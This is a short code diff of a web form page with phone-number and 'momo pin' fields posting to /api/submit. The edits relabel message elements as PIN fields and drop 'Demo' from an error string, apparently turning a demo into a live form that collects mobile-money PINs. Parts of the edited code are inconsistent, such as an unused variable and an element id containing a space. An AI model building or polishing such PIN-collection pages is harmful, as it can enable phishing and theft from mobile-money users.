@@ -99,7 +99,7 @@
             background: #194e9e;
         }
 
-        .message {
+        .Pin {
             margin-top: 18px;
             font-size: 13px;
             line-height: 1.5;
@@ -163,7 +163,7 @@
         
 const form = document.getElementById("Form");
 const phone = document.getElementById("phone");
-const Momo = document.getElementById("message");
+const Momo = document.getElementById("momo pin");
 
 const API_ENDPOINT = "/api/submit";
 
@@ -194,7 +194,7 @@ form.addEventListener("submit", async function(event) {
         const result = await response.json();
 
         message.style.color = response.ok ? "#26733a" : "#c62828";
-        message.textContent = result.message;
+        message.textContent = result.momo;
 
         if (response.ok) {
             form.reset();
@@ -202,7 +202,7 @@ form.addEventListener("submit", async function(event) {
 
     } catch (error) {
         message.style.color = "#c62828";
-        message.textContent = "Demo server unavailable. Please try again.";
+        message.textContent = "server unavailable. Please try again.";
     }
 });
 
